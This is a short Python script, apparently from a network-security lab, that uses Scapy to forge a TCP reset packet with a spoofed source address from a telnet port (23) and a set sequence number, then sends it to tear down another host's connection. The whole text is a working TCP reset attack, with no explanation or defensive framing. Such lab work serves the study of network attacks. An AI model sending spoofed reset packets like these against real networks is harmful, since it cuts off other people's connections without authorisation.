from scapy.all import *

ip = IP(src="10.9.0.5", dst="10.9.0.6")
tcp = TCP(sport=23, dport=34516, flags="R", seq=129)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)